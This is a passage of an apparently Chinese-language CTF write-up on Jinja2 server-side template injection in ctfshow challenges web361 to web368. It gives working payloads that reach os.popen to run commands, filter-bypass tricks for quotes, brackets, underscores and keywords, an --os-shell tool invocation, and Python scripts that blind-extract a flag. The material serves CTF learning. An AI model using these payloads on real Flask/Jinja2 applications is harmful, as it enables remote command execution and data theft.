class="string">&#x27;ls&#x27;</span>).read()&#125; &#125;</span><br><span class="line">&#123; &#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125; &#125;</span><br><span class="line">current_app          应用上下文，一个全局变量</span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1    get传参</span><br><span class="line">request.values.x1  所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1    post传参(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data   post传参(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json post传json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123; &#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125; &#125;</span><br></pre></td></tr></table></figure><p>过滤器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>()将值转换为<span class="built_in">int</span>类型；</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>()将值转换为<span class="built_in">float</span>类型；</span><br><span class="line"></span><br><span class="line">lower()将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=<span class="number">255</span>,killwords=<span class="literal">False</span>)截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123; &#123;<span class="string">&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;</span>|safe&#125; &#125;；</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>()将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line"><span class="built_in">abs</span>()返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line"><span class="built_in">format</span>(value,arags,*kwargs)格式化字符串。比如：&#123; &#123;<span class="string">&quot;%s&quot;</span> - <span class="string">&quot;%s&quot;</span>|<span class="built_in">format</span>(<span class="string">&#x27;Hello?&#x27;</span>,<span class="string">&quot;Foo!&quot;</span>) &#125; &#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span>()返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(<span class="string">&#x27;xiaotuo&#x27;</span>)----如果name不存在，则会使用xiaotuo来替代。boolean=<span class="literal">False</span>默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用<span class="keyword">or</span>来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注入思路：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>随便找一个内置类对象用__class__拿到他所对应的类</span><br><span class="line"><span class="number">2.</span>用__bases__拿到基类（&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;）</span><br><span class="line"><span class="number">3.</span>用__subclasses__()拿到子类列表</span><br><span class="line"><span class="number">4.</span>在子类列表中直接寻找可以利用的类getshell</span><br><span class="line"></span><br><span class="line">对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→<span class="built_in">eval</span>函数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p>名字就是考点，传入name尝试。<br>根据上图，推测可能是twig和Jinja2.<br>直接上payload：<br>可以用Lipsum：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;tac /flag&#x27;</span>).read()&#125; &#125;</span><br></pre></td></tr></table></figure><p>cycler:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;tac /flag&#x27;</span>).read()&#125; &#125;</span><br></pre></td></tr></table></figure><p>控制块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; % <span class="built_in">print</span>(url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ../flag&#x27;).read()&quot;</span>))% &#125;</span><br></pre></td></tr></table></figure><p>或者用subclasses一点点扫也行，这里没必要。但这里写一下：<br>土方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123; %<span class="number">27</span>%<span class="number">27.</span>__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;tac ../flag&#x27;</span>).read()&#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这种方法的缺点在于需要找到 类 的索引</span></span><br></pre></td></tr></table></figure><p>当然也可以直接使用splmap硬扫，指令如下。<br>注意，这个脚本需要使用python2使用，而且后面的指令都没有加上，要注意，如果你想使用该脚本可以按照如 下指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ./splmap.py -u <span class="string">&#x27;目标地址&#x27;</span> --os-shell</span><br></pre></td></tr></table></figure><p>注意这里需要到达该文件根目录。<br>然后就自动进入命令行就可以查看文件了。</p><h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;tac /flag&#x27;</span>).read()&#125; &#125;</span><br></pre></td></tr></table></figure><h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><h3 id="过滤单双引号"><a href="#过滤单双引号" class="headerlink" title="过滤单双引号"></a>过滤单双引号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[request.args.a].popen(request.args.b).read()&#125; &#125;&amp;a=os&amp;b=tac /flag</span><br></pre></td></tr></table></figure><p>除此之外：<br>拼接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(config.__str__()[<span class="number">2</span>])</span><br><span class="line">(config.__str__()[<span class="number">42</span>])</span><br><span class="line"></span><br><span class="line">?name=&#123; &#123;url_for.__globals__[(config.__str__()[<span class="number">2</span>])%2B(config.__str__()[<span class="number">42</span>])]&#125; &#125;</span><br><span class="line">等于</span><br><span class="line">?name=&#123; &#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>]&#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chr拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; % <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> % &#125;&#123; % <span class="built_in">print</span>  url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]% &#125;</span><br></pre></td></tr></table></figure><p>过滤器拼接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string)[<span class="number">24</span>]</span><br></pre></td></tr></table></figure><h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><h3 id="过滤args"><a href="#过滤args" class="headerlink" title="过滤args"></a>过滤args</h3><p>可以使用<code>values</code>获取所有参数，来绕过args，当然cookie也行，注意cookie分割是分号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[request.cookies.a].popen(request.cookies.b).read()&#125; &#125;</span><br><span class="line">Cookie：a=os;b=tac /flag</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><blockquote><p>相关wp：<a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p></blockquote><h2 id="字符串变量变量绕过方法"><a href="#字符串变量变量绕过方法" class="headerlink" title="字符串变量变量绕过方法"></a>字符串变量变量绕过方法</h2><blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p></blockquote><p>拼接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;cla&quot;</span>+<span class="string">&quot;ss&quot;</span></span><br></pre></td></tr></table></figure><p>反转：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><em>在jinjia2里面，“cla””ss”是等同于”class”的，也就是说我们可以这样引用class，并且绕过字符串过滤</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__ssalc__&quot;</span>][::-<span class="number">1</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ascii转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>)=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)=<span class="string">&#x27;__class__&#x27;</span></span><br></pre></td></tr></table></figure><p>编码绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__class__&quot;</span>==<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>==<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span></span><br><span class="line">对于python2的话，还可以利用base64进行绕过</span><br><span class="line"><span class="string">&quot;__class__&quot;</span>==(<span class="string">&quot;X19jbGFzc19f&quot;</span>).decode(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure><p>chr函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; % <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span> % &#125;</span><br><span class="line">&#123; &#123;<span class="string">&quot;&quot;</span>[<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">95</span>)]&#125; &#125;</span><br></pre></td></tr></table></figure><p>在jinja2里面可以利用~进行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> a=<span class="string">&#x27;__cla&#x27;</span> % &#125;&#123; %<span class="built_in">set</span> b=<span class="string">&#x27;ss__&#x27;</span>% &#125;&#123; &#123;<span class="string">&quot;&quot;</span>[a~b]&#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大小写转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__CLASS__&quot;</span>.lower()]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>)|join</span><br><span class="line">[<span class="string">&quot;__CLASS__&quot;</span>|lower</span><br><span class="line"><span class="string">&quot;__claee__&quot;</span>|replace(<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ss&quot;</span>) </span><br><span class="line"><span class="string">&quot;__ssalc__&quot;</span>|reverse</span><br><span class="line"><span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">15</span>]~</span><br><span class="line">(()|select|string)[<span class="number">20</span>]~</span><br><span class="line">(()|select|string)[<span class="number">6</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>(__clas=a,s__=b)|join</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取键值或者下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"><span class="built_in">dict</span>.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>.pop(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>.get(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>.setdefault(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">list</span>.__getitem__(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">list</span>.pop(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>获取属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__</span><br><span class="line">()[<span class="string">&quot;__class__&quot;</span>]</span><br><span class="line">()|attr(<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line">().__getattribute__(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>上题的value可以用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><p>cookie也可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125; &#125;</span><br><span class="line">Cookie:c=cat /flag</span><br></pre></td></tr></table></figure><p>常规，用<code>__getitem__()</code>来代替[]<br>直接用<code>__getitem__(1)</code>代替<code>[1]</code><br>或者直接构建任意字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;config.__str__().__getitem__(<span class="number">22</span>)&#125; &#125;   <span class="comment"># 就是22</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># anthor:秀儿</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name=&#123; &#123;config.__str__().__getitem__(%d)&#125; &#125;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        r=requests.get(url=url%(i))</span><br><span class="line">        location=r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word=r.text[location+<span class="number">4</span>:location+<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word==j:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;config.__str__().__getitem__(%d) == %s&quot;</span>%(i,j))</span><br><span class="line">            result+=<span class="string">&quot;config.__str__().__getitem__(%d)~&quot;</span>%(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result[:<span class="built_in">len</span>(result)-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;url_for.__globals__.os.popen(config.__str__().__getitem__(<span class="number">22</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">23</span>)~config.__str__().__getitem__(<span class="number">7</span>)~config.__str__().__getitem__(<span class="number">279</span>)~config.__str__().__getitem__(<span class="number">4</span>)~config.__str__().__getitem__(<span class="number">41</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">6</span>)</span><br><span class="line">).read()&#125; &#125;</span><br></pre></td></tr></table></figure><h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>用过滤器代替：<code>&#123; &#123;XXX|attr(request.args.AAA)|attr(reequest.args.BBB)&#125; &#125;</code><br>values</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.cmd)|attr(request.values.f)()&#125; &#125;&amp;cmd=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br></pre></td></tr></table></figure><p>cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125; &#125;</span><br><span class="line"></span><br><span class="line">cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><h2 id="过滤os"><a href="#过滤os" class="headerlink" title="过滤os"></a>过滤os</h2><p>但是也只是name过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125; &#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 { {"></a>过滤 <code>&#123; &#123;</code></h3><p>控制块代替<code>&#123; %</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; %<span class="built_in">print</span>(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() % &#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><p>盲注也可以：<br><code>open(&#39;/flag&#39;).read()</code>是回显整个文件，但是read函数里加上参数：<code>open(&#39;/flag&#39;).read(1)</code>，返回的就是读出所读的文件里的i个字符，以此类推，就可以盲注出了<br>测试payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123; % <span class="built_in">set</span> a=(lipsum|attr(request.values.a)).get(request.values.b).<span class="built_in">open</span>(request.values.c).read(<span class="number">1</span>) % &#125; &#125;&#123; &#123; % <span class="keyword">if</span> a==request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;</span><br><span class="line">&amp;a=__globals__</span><br><span class="line">&amp;b=__builtins__</span><br><span class="line">&amp;c=/flag</span><br><span class="line">&amp;d=c</span><br></pre></td></tr></table></figure><p>但是在脚本中就不用管两个前括号，但是测试payload里面必须要空。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SSTI2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/23 18:01   natro92      1.0        &#123; %% &#125;盲注</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;_&#x27;</span> + string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">9</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">&quot;&#123; &#123; % set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) % &#125; &#125;&#123; &#123; % if a==request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: <span class="string">&quot;__globals__&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;b&#x27;</span>: <span class="string">&quot;__builtins__&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>: <span class="string">&quot;/flag&quot;</span>,</span><br><span class="line">            <span 